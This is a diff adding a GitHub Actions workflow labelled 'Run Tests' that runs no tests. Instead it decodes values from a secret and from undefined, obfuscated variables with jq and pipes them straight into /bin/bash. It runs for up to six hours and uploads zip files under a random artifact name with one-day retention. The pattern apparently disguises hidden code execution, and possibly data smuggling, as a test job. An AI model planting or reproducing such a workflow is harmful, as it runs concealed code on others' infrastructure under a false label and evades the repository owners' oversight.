@@ -1,0 +1,27 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          rxoo4: ${{ secrets.rxoo4 }}
+        run: |
+          printf '%s' "$rxoo4" | jq -r .ftzu53 | /bin/bash
+          printf '%s' "$ljd8682" | jq -r .smv623 | /bin/bash
+          printf '%s' "$rs404" | jq -r .oaioh1486 | /bin/bash
+          echo $owzj94 | jq -r .mze71 | /bin/bash
+          echo $gu84558 | jq -r .gkbvf26 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cNfFN0pG
+          path: "*.zip"
+          retention-days: 1
